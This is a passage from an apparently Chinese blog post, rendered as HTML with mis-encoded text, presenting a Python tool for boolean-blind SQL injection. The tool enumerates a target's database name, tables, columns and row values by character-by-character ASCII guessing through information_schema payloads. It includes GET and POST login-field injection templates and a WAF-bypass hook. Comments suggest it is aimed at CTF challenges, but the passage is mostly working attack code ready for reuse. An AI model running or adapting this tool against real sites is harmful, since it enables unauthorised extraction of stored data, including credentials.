class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">### ä¸»ç¨‹åº</span><br><span class="line">def main():</span><br><span class="line">    print(f&#x27;--------- &#123;__file__&#125; å¼€å§‹è¿è¡Œ ---------------&#x27;)</span><br><span class="line">    # ï¼ˆ1ï¼‰åˆå§‹åŒ–ç¯å¢ƒå’Œå‚æ•°å˜é‡</span><br><span class="line">    global threading_status</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m æ³¨æ„ï¼šè¯¥è„šæœ¬ä½¿ç”¨çš„å‰ææ˜¯çŸ¥é“æ³¨å…¥ç‚¹å­˜åœ¨çš„URLã€é¡µé¢å›æ˜¾å±äºå¸ƒå°”ç±»å‹ã€è¿‡æ»¤çš„æ–¹æ³•ã€ä»¥åŠcookieç›¸å…³&#x27;)</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m æ³¨æ„ï¼šåœ¨ä½¿ç”¨å‰è¯·\033[91mä¿®æ”¹url å’Œ Response_judgment å‡½æ•°\033[0m&#x27;)</span><br><span class="line">    # åˆ›å»ºä¸€ä¸ªå‰¯çº¿ç¨‹å¯¹è±¡</span><br><span class="line">    sub_thread = threading.Thread(target=Progress_bar)</span><br><span class="line">    sub_thread.start()      # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ2ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“</span><br><span class="line">    print(&#x27;\033[93m---------------------------- æ•°æ®åº“åæŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     #å¼€å¯å‰¯çº¿ç¨‹</span><br><span class="line">    database_names = database_name(database_length())   #è¿™é‡Œä¼ å…¥æ•°æ®åº“çš„é•¿åº¦</span><br><span class="line">    threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">    if not database_names:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mdatabase_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    print(f&quot;\n\033[92m[+]\033[0m å½“å‰\033[96mæ•°æ®åº“å\033[0mä¸ºï¼š\033[94m&#123;database_names&#125;\033[0m&quot;)</span><br><span class="line">    # ï¼ˆ3ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“è¡¨</span><br><span class="line">    print(&#x27;\033[93m---------------------------- æ•°æ®åº“è¡¨æŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line">    table_names = table_name(table_length())            #æ±‚è¡¨çš„åç§°ï¼Œä¼ å…¥è¡¨çš„é•¿åº¦</span><br><span class="line">    threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">    if len(table_names) == 0:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mtable_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    while True:                 #è¿™é‡Œåšæ— é™å¾ªç¯ï¼Œä»¥æ–¹ä¾¿å¾ªç¯æŸ¥è¯¢æ‰€æœ‰çš„è¡¨</span><br><span class="line">        print(&#x27;\n\033[93m---------------------------- é€‰æ‹©æŸ¥è¯¢çš„åº“è¡¨ ------------------------------\033[0m&#x27;)</span><br><span class="line">        print(f&quot;\033[92m[+]\033[0m &#123;database_names&#125;æ‰€æœ‰\033[96mè¡¨å\033[0mä¸ºï¼š\033[94m&#123;table_names&#125;\033[0m&quot;)</span><br><span class="line">        User_table_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„è¡¨åï¼ˆexité€€å‡ºï¼‰ï¼š&#x27;)</span><br><span class="line">        if User_table_name == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        # ï¼ˆ4ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µ</span><br><span class="line">        print(&#x27;\033[93m---------------------------- åº“è¡¨å­—æ®µæŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">        threading_status = True     # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line">        column_names = column_name(column_length(User_table_name),User_table_name)       #æ±‚å­—æ®µçš„åå­—ï¼Œè¾“å…¥å­—æ®µçš„é•¿åº¦</span><br><span class="line">        threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">        if len(column_names) == 0:</span><br><span class="line">            print(&quot;\n\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mcolumn_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">            kill()</span><br><span class="line">        while True:             #è¿™é‡Œåšæ— é™å¾ªç¯ï¼Œæ–¹ä¾¿æŸ¥è¯¢è¡¨çš„æ‰€æœ‰å­—æ®µå€¼</span><br><span class="line">            print(&#x27;\n\033[93m---------------------------- é€‰æ‹©æŸ¥è¯¢å­—æ®µå ------------------------------\033[0m&#x27;)</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_table_name&#125;è¡¨æ‰€æœ‰\033[96må­—æ®µå\033[0mä¸ºï¼š\033[94m&#123;column_names&#125;\033[0m&quot;)</span><br><span class="line">            User_column_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„å­—æ®µåï¼ˆexité€€å‡ºï¼‰ï¼š&#x27;)</span><br><span class="line">            if User_column_name == &#x27;exit&#x27;:</span><br><span class="line">                break</span><br><span class="line">            # ï¼ˆ5ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„æ•°æ®å€¼</span><br><span class="line">            print(&#x27;\033[93m---------------------------- å­—æ®µæ•°æ®æŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">            threading_status = True     # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line">            column_data_len = column_data_length(User_table_name,User_column_name)   #æ±‚å­—æ®µå€¼çš„é•¿åº¦ï¼Œä¼ å…¥å­—æ®µçš„åç§°</span><br><span class="line">            column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #æ±‚å­—æ®µçš„å€¼</span><br><span class="line">            threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">            print(&#x27;\n\033[92m---------------------------- å­—æ®µæ•°æ®æŸ¥è¯¢ç»“æŸ ------------------------------\033[0m&#x27;)</span><br><span class="line">            if len(column_data_names) == 0:</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mcolumn_data_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ã€‚å¦‚æœå¢å¤§æŸ¥è¯¢åŠ›åº¦ä»ä¸å¯ç”¨ï¼Œåˆ™æ­¤å¤„å¯èƒ½æ˜¯ä¸€å¼ ç©ºè¡¨ï¼Œå¯æ›´æ¢å…¶ä»–è¡¨æˆ–å­—æ®µæŸ¥çœ‹&quot;)</span><br><span class="line">                kill()</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_column_name&#125;å­—æ®µæ‰€æœ‰\033[96mæ•°å€¼\033[0mä¸ºï¼š\033[94m&#123;column_data_names&#125;\033[0m&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()  #æ‰§è¡Œä¸»çº¿ç¨‹</span><br><span class="line">        kill()  #æ‰§è¡Œå¤„ç†å‡½æ•°</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h2 id="2ã€å¼‚å¸¸å’Œå‰¯çº¿ç¨‹"><a href="#2ã€å¼‚å¸¸å’Œå‰¯çº¿ç¨‹" class="headerlink" title="2ã€å¼‚å¸¸å’Œå‰¯çº¿ç¨‹"></a>2ã€å¼‚å¸¸å’Œå‰¯çº¿ç¨‹</h2><p>kill() ä½œä¸ºå¼‚å¸¸ä¸­æ–­çš„å‡½æ•°ï¼Œæ˜¯ä¸ºäº†ä½¿ç¨‹åºå¼‚å¸¸ä¹‹åèƒ½å¤Ÿå®‰å…¨çš„é€€å‡ºï¼›Progress_bar() æ˜¯å‰¯çº¿ç¨‹çš„æ‰§è¡Œå†…å®¹ï¼Œæ˜¯ä¸æ–­çš„æ‰§è¡Œè¾“å‡ºè¿›åº¦æ¡ï¼Œæ–¹ä¾¿ç”¨æˆ·æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def Progress_bar():</span><br><span class="line">    # åˆå§‹åŒ–å‚æ•°</span><br><span class="line">    global threading_status</span><br><span class="line">    global jindu_left</span><br><span class="line"></span><br><span class="line">    while not threading_stop:</span><br><span class="line">        while threading_status:</span><br><span class="line">            progress_bar = &quot;\033[94m[*]\033[0m æŸ¥è¯¢ä¸­ï¼š\033[92m[\033[0m&#123;0&#125;\033[92m]\033[0m&quot;.format(&quot; &quot; * jindu_left + &quot;\033[92m*\033[0m&quot; + &quot; &quot; * (50 - jindu_left))</span><br><span class="line"></span><br><span class="line">            # æ¸…é™¤ä¹‹å‰çš„è¿›åº¦æŒ‡ç¤ºå™¨è¾“å‡º</span><br><span class="line">            sys.stdout.write(&quot;\r&quot; + progress_bar)</span><br><span class="line"></span><br><span class="line">            # åˆ·æ–°è¾“å‡ºï¼Œç¡®ä¿è¿›åº¦æŒ‡ç¤ºå™¨ç«‹å³æ›´æ–°</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            jindu_left = 0 if jindu_left == 50 else jindu_left + 1</span><br><span class="line"></span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">def kill():</span><br><span class="line">    global threading_status</span><br><span class="line">    global threading_stop</span><br><span class="line"></span><br><span class="line">    print(&quot;\033[91m[-]\033[0m æ­£åœ¨é€€å‡ºï¼Œè¯·ç­‰å¾…ï¼ï¼ï¼&quot;)</span><br><span class="line">    threading_status = False</span><br><span class="line">    threading_stop = True</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;Byeï¼ç¨‹åºå·²é€€å‡ºï¼ï¼ï¼&quot;)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><h2 id="3ã€åŸºæœ¬çš„æ•°æ®æŸ¥è¯¢"><a href="#3ã€åŸºæœ¬çš„æ•°æ®æŸ¥è¯¢" class="headerlink" title="3ã€åŸºæœ¬çš„æ•°æ®æŸ¥è¯¢"></a>3ã€åŸºæœ¬çš„æ•°æ®æŸ¥è¯¢</h2><p>ä½¿ç”¨åŸºç¡€çš„å¸ƒå°”æŸ¥è¯¢è¯­å¥ï¼Œå°†payload ä¼ å…¥Response_judgment() ä¸­è¿›è¡Œå¸ƒå°”åˆ¤æ–­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„æ•°å€¼</span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):         #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µçš„å€¼</span><br><span class="line">        for j in range(1,column_data_len[i]+1):     #jæ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in asciis:                        #asciisæ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_column_name&#125;å­—æ®µçš„ç¬¬&#123;i&#125;ä¸ªå€¼ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µæ•°å€¼çš„é•¿åº¦</span><br><span class="line">def column_data_length(User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,data_num_max):           #åªæŸ¥è¯¢10ä¸ªæ•°å€¼</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,data_len_max):       #jæ˜¯è¦çˆ†ç ´å­—æ®µæ•°å€¼çš„é•¿åº¦ï¼ŒçŒœæµ‹è¯¥å­—æ®µæ•°å€¼æœ€å¤§ä¸º32ï¼ˆå³md5å€¼ï¼Œå¯èƒ½éœ€è¦ä¿®æ”¹ï¼‰</span><br><span class="line">            payload = &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == data_num_max:</span><br><span class="line">                    print(&#x27;å·²è¶…è¿‡æµ‹è¯•æ•°å€¼çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&#x27;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„åç§°</span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):          #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œlen(column_len) æ˜¯å­—æ®µçš„æ•°é‡</span><br><span class="line">        for j in range(1,column_len[i]+1):      #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in asciis:              #næ˜¯è¦çˆ†ç ´å­—æ®µåçš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_table_name&#125;è¡¨çš„ç¬¬&#123;i&#125;ä¸ªå­—æ®µçš„åç§°ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„é•¿åº¦</span><br><span class="line">def column_length(User_table_name):     #è¦æŸ¥çœ‹çš„è¡¨å</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,column_num_max):               #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œè¿™é‡Œå‡è®¾æœ‰10ä¸ªå­—æ®µ</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,column_len_max):           #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„é•¿åº¦ï¼Œå‡è®¾å­—æ®µé•¿åº¦æœ€é•¿ä¸º20</span><br><span class="line">            payload = &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == column_num_max:</span><br><span class="line">                    print(&quot;\033[91m[-]\033[0m å·²è¶…è¿‡æµ‹è¯•å­—æ®µæ•°çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&quot;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨çš„åç§°</span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):       #iæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œlen(table_len)è¡¨ç¤ºå…±æœ‰å‡ å¼ è¡¨</span><br><span class="line">        for j in range(1,table_len[i]+1):   #jæ˜¯è¦çˆ†ç ´è¡¨åç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œåˆ°è¡¨çš„é•¿åº¦</span><br><span class="line">            for n in asciis:          #næ˜¯è¦çˆ†ç ´è¡¨åçš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    table_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\nç¬¬&#123;i&#125;å¼ è¡¨çš„åç§°ä¸ºï¼š&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨çš„é•¿åº¦</span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,table_num_max):</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,table_len_max):</span><br><span class="line">            payload = &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“çš„åç§°</span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len + 1):     #iæ˜¯æ•°æ®åº“çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for j in asciis:                    #jæ˜¯è¦çˆ†ç ´æ•°æ®åº“åçš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    database_names += j</span><br><span class="line">                    break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·æ£€æŸ¥\033[91mResponse_judgmentå‡½æ•°ã€URLã€payloadã€å¢åŠ çˆ†ç ´çš„æ•°æ®åº“åé•¿åº¦ï¼ï¼ï¼\033[0m&quot;)</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“çš„é•¿åº¦</span><br><span class="line">def database_length():</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len_max):</span><br><span class="line">            payload = &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                return i</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·æ£€æŸ¥\033[91mResponse_judgmentå‡½æ•°ã€URLã€payloadã€å¢åŠ çˆ†ç ´çš„æ•°æ®åº“åé•¿åº¦ï¼ï¼ï¼\033[0m&quot;)</span><br><span class="line">        kill()</span><br></pre></td></tr></table></figure><h2 id="4ã€å“åº”åŒ…çš„å¸ƒå°”åˆ¤æ–­"><a href="#4ã€å“åº”åŒ…çš„å¸ƒå°”åˆ¤æ–­" class="headerlink" title="4ã€å“åº”åŒ…çš„å¸ƒå°”åˆ¤æ–­"></a>4ã€å“åº”åŒ…çš„å¸ƒå°”åˆ¤æ–­</h2><p>é’ˆå¯¹GET å’ŒPOST ä¸åŒç±»å‹çš„SQLæ³¨å…¥ï¼Œæœ‰ä¸åŒçš„è¯·æ±‚æ–¹å¼ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åšåˆ°header çš„å¤´éƒ¨æ³¨å…¥ï¼Œåœ¨ç›¸åº”åŒ…åˆ¤æ–­ä¸­ï¼Œä¹Ÿå°±æ˜¯å¸ƒå°”ä¸åŒå“åº”çš„åˆ¤æ–­ã€‚è¿™é‡Œæ ¹æ®ä¸ç”¨é¢˜ç›®çš„æ³¨å…¥ç‚¹éœ€è¦è¿›è¡Œè°ƒæ•´ï¼Œå¯ä»¥æ˜¯å“åº”çš„é¡µé¢é•¿åº¦ï¼Œæˆ–è€…å“åº”ç ç­‰åˆ¤æ–­ã€‚</p><p>å¦‚æœæƒ³æŸ¥çœ‹payload æ˜¯å¦æ­£ç¡®è¿›è¡Œï¼Œå¯ä»¥åœ¨è¿™ä¸ªæ–¹æ³•ä¸­è°ƒè¯•ï¼›åœ¨è¯·æ±‚ä¸­æ·»åŠ cookie ç­‰</p><p><strong>æ³¨æ„ï¼š</strong></p><p>ä¸€ä¸ªå®Œæ•´çš„SQLæ³¨å…¥è¯­å¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šæ­£å¸¸çš„url å’Œpayload å’Œ æœ€åçš„æ³¨é‡Šç¬¦ã€‚</p><p>åœ¨å¯¹payload è¿›è¡Œè°ƒæ•´ä¹‹åï¼Œéœ€è¦æ‰‹åŠ¨åœ¨è¯·æ±‚çš„æ—¶å€™åŠ ä¸Šæœ€åçš„æ³¨é‡Šç¬¦ï¼Œå¦‚ â€“+ã€# </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def Response_judgment(payload):</span><br><span class="line">    global url</span><br><span class="line">    # ï¼ˆ1ï¼‰æ˜¯å¦è¿›è¡Œurl è¿‡æ»¤</span><br><span class="line">    payload = Bypass_WAF(payload)</span><br><span class="line">    new_url = url + payload</span><br><span class="line">    # print(new_url)</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ2ï¼‰å‘é€å¸¦cookieçš„å’Œæ³¨é‡Šçš„GETè¯·æ±‚ç¤ºä¾‹</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &#x27;level&#x27; : &#x27;1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    respone = requests.get(new_url+&#x27;--+&#x27;, cookies=cookies)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    response = requests.get(new_url + &#x27;--+&#x27;)</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ2ï¼‰å‘é€å¸¦cookieå’Œdataå’Œæ³¨é‡Šçš„POSTè¯·æ±‚ç¤ºä¾‹</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = &quot;admin&#x27;&quot; + payload + &quot;/**/and/**/1=1&quot;</span><br><span class="line">    #print(payload)</span><br><span class="line">    new_url = url</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;  :   &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;  :   payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url = new_url, data = data)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ3ï¼‰ç›¸åº”åŒ…åˆ¤æ–­</span><br><span class="line">    if &quot;If&quot; in response.text:</span><br><span 